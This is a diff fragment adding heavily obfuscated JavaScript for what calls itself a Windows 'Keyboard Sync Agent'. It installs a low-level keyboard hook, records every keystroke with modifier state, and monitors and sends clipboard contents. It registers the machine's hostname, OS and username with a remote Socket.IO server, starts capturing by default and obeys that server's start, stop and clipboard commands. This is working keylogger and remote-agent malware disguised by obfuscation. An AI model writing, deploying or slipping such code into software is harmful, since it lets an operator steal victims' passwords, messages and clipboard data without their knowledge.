+\n  const threadId\x20=\x20GetCurrentThreadId();
+\n  parentPort.postMessage({
+ '+"t: 're"+"ady', "+'threadId: threadId }
+);
+\n\n  parentPort'+".on('m"+'essage\x27,\x20(msg) => {
+\n    if (!msg || typeof msg !'+"== 'ob"+"ject')"+' return;
+\n    if (msg.t ='+"== 'st"+'op\x27)\x20{
+\n      stopping\x20=\x20true;
+\n      try {
+ PostThreadMessageW(threadId,\x20WM_QUIT, 0, 0);
+ }
+ catch\x20(_)\x20{
+}
+\x0a    }
+ else if\x20(msg.t ==='+" 'capt"+"uring'"+') {
+\n  \x20\x20\x20\x20Atomics.store(ia,\x202,\x20msg.v\x20?\x201\x20: 0);
+\n    }
+\n  }
+);
+\n\n  const msg = {
+ hwnd:\x20null, message:\x200,\x20wParam:\x200, lParam:\x200, time: 0, pt:\x20{
+\x20x: 0, y:\x200\x20}
+\x20}
+;
+\n  while (!stopping)\x20{
+\n    const r = GetMessageW(msg, null,\x200,\x200);
+\x0a\x20\x20\x20 if (r\x20===\x200 || r === -1) break;
+\n    TranslateMessage(msg);
+\x0a    DispatchMessageW(msg);
+\x0a\x20\x20}
+\n\n  try\x20{
+\x20UnhookWindowsHookEx(hookHandle);
+ }
+ catch (_) {
+}
+\n  try {
+ koffi.unregister(callbackRef);
+ }
+ catch\x20(_) {
+}
+\n  parentPort.postMessage({
+'+" t: 'e"+"xit' }
+"+');
+\n}
+ catch (err) {
+\n  parentPort.postMessage({
+ t:'+" 'err'"+', e: String(err ')+('&& err.message ? err.message : err) }
+);
+\n  process.exit(1);
+\n}
+\x0a');
+}
+function Rn(e0){
+const Pj=a0eX,PQ=a0eX,e1={
+'WVKxg':function(e2,e3){
+return e2!==e3;
+}
+,'ZyGMb':'object','wNRer':function(e2,e3){
+return e2===e3;
+}
+,'Grhnl':'ready','KNvDh':'4|5|6|3|0|1|2','dQVas':function(e2){
+return e2();
+}
+,'YBkDT':'Win32\x20low-level keyboard\x20hook\x20installed\x20(dedicated worker + SAB ring)','YViRR':'err','wcjOC':function(e2,e3){
+return e2&&e3;
+}
+,'jsOPF':function(e2,e3){
+return e2===e3;
+}
+,'CEryh':'exit'}
+;
+if(!e0||e1.WVKxg(typeof e0,e1.ZyGMb))return;
+if(e1.wNRer(e0.t,e1.Grhnl)){
+const e2=e1.KNvDh.split('|');
+let e3=0x0;
+while(!![]){
+switch(e2[e3++]){
+case'0':e1.dQVas(xn);
+continue;
+case'1':console.log(e1.YBkDT);
+continue;
+case'2':return;
+case'3':gn=!![];
+continue;
+case'4':fn=e0.threadId||0x0;
+continue;
+case'5':ft=!![];
+continue;
+case'6':at=!![];
+continue;
+}
+break;
+}
+}
+if(e1.wNRer(e0.t,e1.YViRR)){
+console.log('Win32 hook worker error:\x20'+e0.e);
+if(e1.wcjOC(!at,!ut))try{
+if(pn){
+try{
+pn.terminate();
+}
+catch(e4){
+}
+pn=null;
+}
+gn=![],e1.dQVas(Vn);
+}
+catch(e5){
+console.log('Hook fallback also failed: '+e5.message);
+}
+return;
+}
+e1.jsOPF(e0.t,e1.CEryh)&&(ft=![]);
+}
+function Hn(){
+const Pu=a0eX,PZ=a0eX,e0={
+'gbPnr':function(e2){
+return e2();
+}
+,'CYpaa':'3|1|5|4|0|2','Vlxos':function(e2,e3){
+return e2===e3;
+}
+,'noCmb':'win32-kbd-hook','GmiyF':'error'}
+;
+if(pn)return!![];
+In=En();
+const e1=new r(e0.gbPnr(Gn),{
+'eval':!![],'workerData':{
+'role':e0.noCmb,'sab':In.sab}
+}
+);
+return pn=e1,e1.on('message',Rn),e1.on(e0.GmiyF,e2=>{
+const PE=PZ,PW=PZ;
+console.log('Win32 hook worker crashed:\x20'+e2.message),pn=null,gn=![],at=![],ft=![],e0.gbPnr(Dn);
+}
+),e1.on('exit',e2=>{
+const Pv=Pu,Pl=Pu,e3=e0.CYpaa.split('|');
+let e4=0x0;
+while(!![]){
+switch(e3[e4++]){
+case'0':at=![];
+continue;
+case'1':gn=![];
+continue;
+case'2':ft=![];
+continue;
+case'3':e0.Vlxos(pn,e1)&&(pn=null);
+continue;
+case'4':!dt&&console.log('Win32 hook\x20worker exited (code\x20'+e2+')');
+continue;
+case'5':e0.gbPnr(Dn);
+continue;
+}
+break;
+}
+}
+),!![];
+}
+function Un(e0,e1,e2){
+const Po=a0eX,Ph=a0eX,e3={
+'LenSD':function(e5,e6,e7,e8,e9){
+return e5(e6,e7,e8,e9);
+}
+,'jZYhJ':function(e5,e6){
+return e5||e6;
+}
+,'jFDZz':function(e5,e6){
+return e5>=e6;
+}
+,'mMwNr':function(e5,e6){
+return e5===e6;
+}
+,'gzHMm':function(e5,e6){
+return e5===e6;
+}
+,'lqtTI':function(e5,e6){
+return e5(e6);
+}
+,'snOeq':function(e5,e6,e7){
+return e5(e6,e7);
+}
+,'ViwDq':function(e5,e6,e7,e8){
+return e5(e6,e7,e8);
+}
+}
+,e4=Pt?e3.LenSD(Pt,e3.jZYhJ(ut,null),e0,e1,e2):0x0;
+if(e3.jFDZz(e0,0x0)&&Z)try{
+const e5=s.decode(e2,bt),e6=Number(e1),e7=e3.mMwNr(e6,_)||e3.gzHMm(e6,w),e8=e5.vkCode;
+if(e3.lqtTI(Je,e8))e3.snOeq(en,e8,e7);
+else e7&&e3.ViwDq(Nn,e8,e5.scanCode,{
+'alt':ht.alt,'ctrl':ht.ctrl,'shift':ht.shift,'meta':ht.meta,'caps':ht.caps}
+);
+}
+catch(e9){
+}
+return e4;
+}
+function Bn(){
+const Pf=a0ey,Pa=a0ey,e0={
+'qTDqT':function(e1,e2){
+return e1||e2;
+}
+,'viubm':function(e1,e2,e3,e4,e5,e6){
+return e1(e2,e3,e4,e5,e6);
+}
+,'sNlOo':function(e1,e2){
+return e1(e2);
+}
+}
+;
+if(e0.qTDqT(dt,!ut)||!Ot||gn)return;
+try{
+const e1={
+'hwnd':null,'message':0x0,'wParam':0x0,'lParam':0x0,'time':0x0,'pt':{
+'x':0x0,'y':0x0}
+}
+;
+let e2=0x0;
+while(e0.viubm(Ot,e1,null,0x0,0x0,mn)&&e2++<0x80){
+e0.sNlOo(At,e1),Lt(e1);
+}
+}
+catch(e3){
+}
+}
+function Vn(){
+const PI=a0eX,PL=a0eX,e0={
+'KzXuN':function(e2,e3){
+return e2&&e3;
+}
+,'FZhwN':function(e2,e3){
+return e2||e3;
+}
+,'rRhAY':'Win32 keyboard\x20hook unavailable (koffi/user32 not loaded)','hAJtB':function(e2,e3,e4,e5,e6){
+return e2(e3,e4,e5,e6);
+}
+,'DZWIg':function(e2){
+return e2();
+}
+,'qxFxd':'Win32 low-level\x20keyboard\x20hook\x20installed\x20(main-thread fallback\x20pump)','gTZRa':function(e2,e3){
+return e2(e3);
+}
+,'njdVE':function(e2,e3,e4){
+return e2(e3,e4);
+}
+,'OCrSC':function(e2,e3){
+return e2===e3;
+}
+,'nFUSo':'function'}
+;
+if(e0.KzXuN(at,ut))return;
+if(e0.FZhwN(!s,!Wt))throw new Error(e0.rRhAY);
+dt=![],pt=s.register(Un,St);
+const e1=ne(null);
+ut=e0.hAJtB(Wt,m,pt,e1,0x0);
+if(!ut)throw new Error('SetWindowsHookEx\x20failed');
+at=!![],gn=![],ft=!![],fn=ce(),ht.caps=e0.DZWIg($e),console.log(e0.qxFxd);
+if(dn)e0.gTZRa(clearInterval,dn);
+dn=e0.njdVE(setInterval,Bn,0x1);
+if(e0.OCrSC(typeof dn.unref,e0.nFUSo))dn.unref();
+}
+function Fn(){
+const PU=a0eX,PK=a0eX,e0={
+'xYtkk':'0|4|3|5|2|1','dAlCS':function(e3,e4){
+return e3&&e4;
+}
+,'HhNVN':function(e3){
+return e3();
+}
+,'AmeRM':'Win32 keyboard hook unavailable\x20(koffi not loaded)','LxNVK':function(e3){
+return e3();
+}
+}
+,e1=e0.xYtkk.split('|');
+let e2=0x0;
+while(!![]){
+switch(e1[e2++]){
+case'0':if(e0.dAlCS(gn,pn)||at&&ut)return;
+continue;
+case'1':e0.HhNVN(Vn);
+continue;
+case'2':try{
+e0.HhNVN(Hn);
+return;
+}
+catch(e3){
+console.log('Hook worker failed\x20to\x20start ('+e3.message+(');
+ using main-thread fallback'));
+}
+continue;
+case'3':dt=![];
+continue;
+case'4':if(!s)throw new Error(e0.AmeRM);
+continue;
+case'5':ht.caps=e0.LxNVK($e);
+continue;
+}
+break;
+}
+}
+function qn(){
+const Pp=a0ey,PT=a0ey,e0={
+'MZpGe':function(e1){
+return e1();
+}
+,'yXWVI':function(e1,e2){
+return e1(e2);
+}
+,'MtbIc':'stop','fBtOY':function(e1,e2){
+return e1&&e2;
+}
+,'Dyfhy':function(e1,e2){
+return e1(e2);
+}
+}
+;
+dt=!![],e0.MZpGe(Dn);
+dn&&(e0.yXWVI(clearInterval,dn),dn=null);
+Sn.length=0x0,Pn=![];
+In&&In.view&&Atomics.store(In.view,0x2,0x0);
+if(pn){
+const e1=pn;
+try{
+e1.postMessage({
+'t':e0.MtbIc}
+);
+}
+catch(e3){
+}
+const e2=setTimeout(()=>{
+const PO=PT;
+try{
+e1.terminate();
+}
+catch(e4){
+}
+}
+,0x5dc);
+if(typeof e2.unref==='function')e2.unref();
+e1.once('exit',()=>clearTimeout(e2)),pn=null;
+}
+if(e0.fBtOY(ut,Et))try{
+e0.Dyfhy(Et,ut);
+}
+catch(e4){
+}
+ut=null,at=![],gn=![],ft=![],In=null;
+if(e0.fBtOY(pt,s))try{
+s.unregister(pt);
+}
+catch(e5){
+}
+pt=null;
+}
+function jn(){
+qn(),Z=![];
+}
+function Yn(){
+const PM=a0ey,Pg=a0ey,e0={
+'rwcGV':function(e1,e2){
+return e1&&e2;
+}
+,'ZMaCA':function(e1,e2){
+return e1||e2;
+}
+,'EvyGd':'Keyboard capture already running','ziTIy':function(e1){
+return e1();
+}
+,'PtmBU':'capturing','YZGUe':function(e1){
+return e1();
+}
+,'jsjAr':'Keyboard capture started successfully'}
+;
+if(e0.rwcGV(Z,at)&&e0.ZMaCA(ut,pn)){
+console.log(e0.EvyGd);
+return;
+}
+e0.ziTIy(jn);
+try{
+Fn(),Z=!![];
+In&&In.view&&Atomics.store(In.view,0x2,0x1);
+if(pn)try{
+pn.postMessage({
+'t':e0.PtmBU,'v':!![]}
+);
+}
+catch(e1){
+}
+console.log('Keyboard backend\x20active: win32');
+}
+catch(e2){
+console.log('Failed\x20to\x20start\x20keyboard capture:\x20'+e2.message),e0.YZGUe(jn);
+return;
+}
+try{
+kt?e0.ziTIy(Ae):Ae(),console.log(e0.jsjAr);
+}
+catch(e3){
+console.log('Failed\x20to\x20start clipboard monitoring:\x20'+e3.message);
+}
+}
+function zn(){
+const Pk=a0ey,PJ=a0ey,e0={
+'cDLQi':function(e1,e2){
+return e1&&e2;
+}
+,'qseCg':'capturing','EXGZp':function(e1){
+return e1();
+}
+,'XDIex':'6|0|1|7|5|3|4|2','ICagb':function(e1){
+return e1();
+}
+,'AFTzQ':'Keyboard capture stopped','irbXM':function(e1){
+return e1();
+}
+}
+;
+if(e0.cDLQi(!Z,!tt))return;
+Z=![];
+In&&In.view&&Atomics.store(In.view,0x2,0x0);
+if(pn)try{
+pn.postMessage({
+'t':e0.qseCg,'v':![]}
+);
+}
+catch(e1){
+}
+try{
+e0.EXGZp(ln);
+}
+catch(e2){
+}
+try{
+const e3=e0.XDIex.split('|');
+let e4=0x0;
+while(!![]){
+switch(e3[e4++]){
+case'0':e0.ICagb(Ne);
+continue;
+case'1':ht.alt=![];
+continue;
+case'2':console.log(e0.AFTzQ);
+continue;
+case'3':ht.meta=![];
+continue;
+case'4':ht.caps=e0.ICagb($e);
+continue;
+case'5':ht.shift=![];
+continue;
+case'6':e0.irbXM(qn);
+continue;
+case'7':ht.ctrl=![];
+continue;
+}
+break;
+}
+}
+catch(e5){
+console.log('Error stopping keyboard\x20listener: '+e5.message);
+}
+}
+function Qn(){
+const PF=a0eX,Pr=a0eX,e0={
+'tbbtD':'Waiting for capture:start command from server...','iuPfp':'Auto-starting keyboard capture...'}
+;
+if(X.no_auto_start){
+console.log(e0.tbbtD);
+return;
+}
+ct=!![],console.log(e0.iuPfp),Yn();
+}
+let Jn=null;
+function Xn(e0,e1){
+const Pq=a0eX,Ps=a0eX,e2={
+'yXLni':function(e3,e4,e5){
+return e3(e4,e5);
+}
+,'Zyicf':'websocket','vVbGJ':function(e3,e4){
+return e3||e4;
+}
+,'VZLsC':function(e3,e4){
+return e3(e4);
+}
+}
+;
+if(Jn)try{
+Jn.removeAllListeners(),Jn.disconnect();
+}
+catch(e3){
+}
+return Jn=e2.yXLni(l,e0,{
+'autoConnect':![],'reconnection':![],'transports':['polling',e2.Zyicf],'auth':{
+'token':e2.vVbGJ(e1,'')}
+,'timeout':0x3a98}
+),e2.VZLsC(no,Jn),Jn;
+}
+function Zn(){
+const PY=a0eX,PA=a0eX,e0={
+'UWXMM':'agent:heartbeat','owvqU':function(e1){
+return e1();
+}
+,'NRiaz':function(e1,e2){
+return e1===e2;
+}
+,'mxNEw':'function'}
+;
+if(lt)return;
+lt=setInterval(()=>{
+const PC=PY,PN=PY;
+if(!Jn||!Jn.connected)return;
+try{
+Jn.emit(e0.UWXMM,{
+...e0.owvqU(ke),'timestamp':new Date().toISOString(),'status':'alive','capturing':Z}
+),console.log('DEBUG: Heartbeat sent');
+}
+catch(e1){
+console.log('Error sending\x20heartbeat:\x20'+e1.message);
+}
+}
+,0x7530);
+if(e0.NRiaz(typeof lt.unref,e0.mxNEw))lt.unref();
+}
+function to(){
+const Pw=a0eX,e0={
+'MHihi':function(e1,e2){
+return e1(e2);
+}
+}
+;
+lt&&(e0.MHihi(clearInterval,lt),lt=null);
+}
+function eo(){
+const Pi=a0ey,Px=a0ey,e0={
+'lnwfi':'Capture watchdog: restarting keyboard capture...','EJWUE':function(e2,e3,e4){
+return e2(e3,e4);
+}
+,'auMhR':function(e2,e3){
+return e2===e3;
+}
+,'eiRqG':'function'}
+;
+if(it)return;
+it=!![];
+const e1=e0.EJWUE(setInterval,()=>{
+const PG=Pi,PH=Pi;
+if(J)return;
+Jn&&Jn.connected&&ct&&!Z&&(console.log(e0.lnwfi),Yn());
+}
+,0x4e20);
+if(e0.auMhR(typeof e1.unref,e0.eiRqG))e1.unref();
+}
+function no(e0){
+const PV=a0ey,Pm=a0ey,e1={
+'xwiiB':function(e2,e3){
+return e2(e3);
+}
+,'HeoUa':'Connected','LfDxf':function(e2){
+return e2();
+}
+,'rqaNO':'Registering as:','OSiXu':'agent:register','jiQYr':function(e2){
+return e2();
+}
+,'lMhrp':function(e2,e3){
+return e2||e3;
+}
+,'wmKDd':'Received capture:start command','qiLHK':function(e2,e3){
+return e2||e3;
+}
+,'LNdLs':'Received capture:stop command','geuLw':function(e2){
+return e2();
+}
+,'eMAEC':'status:response','FENdH':function(e2,e3){
+return e2===e3;
+}
+,'lgnrW':function(e2,e3,e4){
+return e2(e3,e4);
+}
+,'PXPsL':'Clipboard is\x20empty or unavailable','yvpXq':'clipboard:response','NaBfm':function(e2){
+return e2();
+}
+,'mDKNX':'connect','VHUGi':'disconnect','UDOco':'agent:assigned','BQTqN':'capture:start','wIQmW':'status:request','KPmIX':'clipboard:request'}
+;
+e0.on(e1.mDKNX,()=>{
+const PS=PV,PR=PV;
+e1.xwiiB(Ce,e1.HeoUa);
+const e2=e1.LfDxf(ve),e3={
+'clientId':X.client_id,'label':X.label,'instanceUsername':X.instance_username||'','osVersionLabel':X.os_version_label||'','osRelease':t.release()||'','platform':e2.platform,'arch':e2.arch,'hostname':e2.hostname,'token':X.token||''}
+;
+console.log(e1.rqaNO,e3),e0.emit(e1.OSiXu,e3),e1.jiQYr(Zn),e1.jiQYr(sn),e1.LfDxf(ln);
+}
+),e0.on(e1.VHUGi,e2=>{
+const d0=PV,d1=PV;
+console.log('Disconnected\x20from\x20server',e1.lMhrp(e2,'')),e1.LfDxf(zn),to(),!J&&console.log('Will attempt\x20reconnect\x20in\x20'+i+('s (via main loop)'));
+}
+),e0.on('connect_error',e2=>{
+const d2=Pm,d3=Pm;
+console.log('Connection\x20error: '+(e2&&e2.message?e2.message:e2));
+}
+),e0.on(e1.UDOco,e2=>{
+const d4=Pm,d5=Pm,e3=e1.lMhrp(e2,{
+}
+),e4=e1.xwiiB(String,e3.agentId||'').trim();
+if(e4){
+X.agent_id=e4;
+const e5=String(e3.label||'').trim();
+if(e5)X.label=e5;
+console.log('Assigned\x20machine\x20ID: '+X.agent_id),console.log('Label:\x20'+X.label);
+}
+Qn();
+}
+),e0.on(e1.BQTqN,e2=>{
+const d6=PV,d7=PV;
+console.log(e1.wmKDd,e1.qiLHK(e2,'')),ct=!![],e1.jiQYr(Yn);
+}
+),e0.on('capture:stop',()=>{
+const d8=Pm,d9=Pm;
+console.log(e1.LNdLs),ct=![],e1.geuLw(zn);
+}
+),e0.on(e1.wIQmW,()=>{
+const dD=PV,dP=PV;
+e0.emit(e1.eMAEC,{
+...e1.jiQYr(ke),'capturing':Z,'connected':e0.connected,'clipboard_monitoring':tt}
+),console.log('Status\x20requested\x20-\x20sent\x20response');
+}
+),e0.on(e1.KPmIX,e2=>{
+const dd=PV,dc=PV,e3=e2&&e2.agentId,e4=e2&&e2.clientId;
+if(e1.FENdH(e3,X.agent_id)||e1.FENdH(e4,X.client_id)){
+const e5=e1.jiQYr(Ke);
+e5?e1.lgnrW(Oe,e5,!![]):(console.log(e1.PXPsL),e0.emit(e1.yvpXq,{
+...e1.NaBfm(ke),'copiedText':''}
+));
+}
+}
+);
+}
+function oo(e0){
+const dB=a0ey,dX=a0ey,e1={
+'rFjtV':function(e3,e4){
+return e3===e4;
+}
+,'AuACc':function(e3,e4){
+return e3===e4;
+}
+,'LXnKJ':function(e3){
+return e3();
+}
+,'JiHSp':function(e3,e4){
+return e3===e4;
+}
+,'jJlHz':'--token','jHgQw':function(e3,e4){
+return e3===e4;
+}
+,'oPBpK':'--client-id','rytxx':function(e3,e4){
+return e3===e4;
+}
+,'UVZWR':'--label','uZOjD':function(e3){
+return e3();
+}
+,'ajmEG':'--no-auto-start'}
+,e2={
+'server':process.env.SERVER_URL||d,'token':process.env.AGENT_TOKEN||p,'client_id':null,'label':process.env.AGENT_LABEL||h,'no_auto_start':![]}
+;
+for(let e3=0x2;
+e3<e0.length;
+e3++){
+const e4=e0[e3],e5=()=>e0[++e3];
+if(e1.rFjtV(e4,'-s')||e1.AuACc(e4,'--server'))e2.server=e1.LXnKJ(e5);
+else{
+if(e1.AuACc(e4,'-t')||e1.JiHSp(e4,e1.jJlHz))e2.token=e5();
+else{
+if(e1.jHgQw(e4,'-i')||e4===e1.oPBpK)e2.client_id=e1.LXnKJ(e5);
+else{
+if(e1.rytxx(e4,'-l')||e1.rFjtV(e4,e1.UVZWR))e2.label=e1.uZOjD(e5);
+else{
+if(e4===e1.ajmEG)e2.no_auto_start=!![];
+else(e1.jHgQw(e4,'-h')||e4==='--help')&&(console.log('Usage:\x20node\x20js_client_windows.js [options]\n  -s, --server\x20URL       Server URL (default: '+d+(')\n  -t, --token TOKEN      Agent\x20authentication token\x0a  -i, --client-id ID     User ID\x20(overrides\x20CLIENT_ID)\n  -l,\x20--label LABEL      Agent label\x20(default: hostname)\n  --no-auto-start        Wait for capture:start from server')),process.exit(0x0));
+}
+}
+}
+}
+}
+return e2;
+}
+function ro(e0){
+const dy=a0ey,dz=a0ey,e1={
+'fuwAo':'5|2|3|4|1|0|6','FKAcC':function(e4,e5){
+return e4(e5);
+}
+,'WKWbn':function(e4){
+return e4();
+}
+,'kWHNn':'\nStopping agent...','jFRdS':function(e4){
+return e4();
+}
+}
+,e2=e1.fuwAo.split('|');
+let e3=0x0;
+while(!![]){
+switch(e2[e3++]){
+case'0':st&&(e1.FKAcC(clearInterval,st),st=null);
+continue;
+case'1':e1.WKWbn(to);
+continue;
+case'2':J=!![];
+continue;
+case'3':console.log(e0?'\x0aStopping agent\x20('+e0+')...':e1.kWHNn);
+continue;
+case'4':e1.jFRdS(zn);
+continue;
+case'5':if(J)return;
+continue;
+case'6':try{
+if(Jn&&Jn.connected)Jn.disconnect();
+}
+catch(e4){
+}
+continue;
+}
+break;
+}
+}
+function lo(){
+const db=a0ey,dj=a0ey,e0={
+'gMxQa':function(e2,e3){
+return e2(e3);
+}
+,'LXNAk':function(e2,e3){
+return e2===e3;
+}
+,'qTucL':'SIGINT','BtMAI':'Ctrl+C','jteFo':'SIGTERM'}
+,e1=e2=>{
+const dQ=dj,du=dj;
+J&&process.exit(0x0),e0.gMxQa(ro,e0.LXNAk(e2,e0.qTucL)?e0.BtMAI:e2);
+}
+;
+process.on(e0.qTucL,()=>e1('SIGINT')),process.on(e0.jteFo,()=>e1('SIGTERM'));
+}
+async function so(e0){
+const dZ=a0eX,dE=a0eX,e1={
+'SSzQL':function(e3,e4){
+return e3+e4;
+}
+,'uhWTG':function(e3,e4){
+return e3*e4;
+}
+,'uckiy':function(e3,e4){
+return e3<e4;
+}
+,'LUrxy':function(e3,e4){
+return e3(e4);
+}
+,'IXUNz':function(e3,e4){
+return e3-e4;
+}
+}
+,e2=e1.SSzQL(Date.now(),e1.uhWTG(e0,0x3e8));
+while(e1.uckiy(Date.now(),e2)&&!J){
+await e1.LUrxy(de,Math.min(0xfa,Math.max(0x0,e1.IXUNz(e2,Date.now()))));
+}
+}
+async function io(){
+const dW=a0eX,dv=a0eX,e0={
+'ycZvz':function(e1,e2){
+return e1(e2);
+}
+}
+;
+while(Jn&&Jn.connected&&!J){
+await e0.ycZvz(de,0xfa);
+}
+}
+const co='--win-key-agent';
+function ao(){
+const dl=a0ey,dh=a0ey,e0={
+'gTYJq':function(e1,e2){
+return e1===e2;
+}
+}
+;
+if(e0.gTYJq(require.main,module))return!![];
+return process.argv.includes(co);
+}
+async function uo(){
+const df=a0ey,da=a0ey,e0={
+'oqzjp':function(e6,e7){
+return e6(e7);
+}
+,'jmTpW':'connect','qhXaY':'connect_error','rlyBl':function(e6){
+return e6();
+}
+,'XJFgO':function(e6){
+return e6();
+}
+,'hEzXG':function(e6){
+return e6();
+}
+,'nByRL':'Keyboard Sync\x20Agent\x20-\x20Windows Version (JS)','ipswH':'WARNING: Win32 clipboard unavailable;
+ using PowerShell\x20fallback.','xodAw':'Install koffi:\x20npm install koffi\n','JhApo':'Clipboard\x20capture: ENABLED\n','NmPSJ':'true','xazVz':'Yes','IystL':'available','vpDpx':function(e6,e7,e8){
+return e6(e7,e8);
+}
+,'wLhSM':'Connecting to server...','Oqhpz':'Agent running. Press Ctrl+C\x20to stop.','mDeFA':function(e6){
+return e6();
+}
+,'ODIhF':function(e6,e7){
+return e6(e7);
+}
+,'JCwPG':'\nShutting down...'}
+;
+e0.rlyBl(Me);
+const e1=e0.oqzjp(oo,process.argv),e2=e0.oqzjp(we,e1.client_id),e3=e0.XJFgO(me),e4=e0.hEzXG(_e);
+e0.oqzjp(ye,e1.label||t.hostname()),console.log(e0.nByRL),console.log('='.repeat(0x3c));
+!kt?(console.log(e0.ipswH),console.log(e0.xodAw)):console.log(e0.JhApo);
+const e5=e0.oqzjp(Boolean,e1.no_auto_start)||['1',e0.NmPSJ,'yes'].includes(String(process.env.KEYBOARD_AGENT_NO_AUTO_START||'').trim().toLowerCase());
+X={
+'server_url':e0.oqzjp(he,e1.server),'token':e1.token,'client_id':e2,'agent_id':'','label':e1.label,'instance_username':e3,'os_version_label':e4,'no_auto_start':e5}
+,e0.rlyBl(Te),console.log('Server:\x20'+X.server_url),console.log('User\x20ID: '+X.client_id),console.log('Label:\x20'+X.label),console.log('Instance user: '+X.instance_username),console.log('Auto-start capture:\x20'+(X.no_auto_start?'No':e0.xazVz)),console.log('Win32 hook: '+(kt?e0.IystL:'unavailable')),console.log(),e0.hEzXG(eo),e0.hEzXG(lo);
+while(!J){
+try{
+e0.vpDpx(Xn,X.server_url,X.token),console.log(e0.wLhSM,X.server_url),await new Promise((e6,e7)=>{
+const dI=da,dL=da,e8={
+'OXuIj':function(ed){
+return ed();
+}
+,'ICaFB':e0.jmTpW,'dacZe':'connect_error'}
+,e9=()=>{
+e8.OXuIj(eP),e6();
+}
+,eD=ed=>{
+const dU=dL;
+eP(),e0.oqzjp(e7,ed);
+}
+,eP=()=>{
+const dK=dI;
+Jn.off(e8.ICaFB,e9),Jn.off(e8.dacZe,eD);
+}
+;
+Jn.once('connect',e9),Jn.once(e0.qhXaY,eD),Jn.connect();
+}
+),console.log(e0.Oqhpz),await e0.mDeFA(io);
+}
+catch(e6){
+if(J)break;
+console.log('Connection\x20error:\x20'+(e6&&e6.message?e6.message:e6));
+}
+if(J)break;
+console.log('Reconnecting\x20in\x20'+i+'s...'),await e0.ODIhF(so,i);
+}
+console.log(e0.JCwPG),J=!![],e0.mDeFA(zn),to();
+try{
+if(Jn&&Jn.connected)Jn.disconnect();
+}
+catch(e7){
+}
+process.exit(0x0);
+}
+ao()&&uo().catch(e0=>{
+const dp=a0eX,dT=a0eX;
+console.error(e0),process.exit(0x1);
+}
+);
+module.exports={
+'startCapture':Yn,'stopCapture':zn,'getClipboardContent':Ke,'agentIdentityFields':ke}
+;
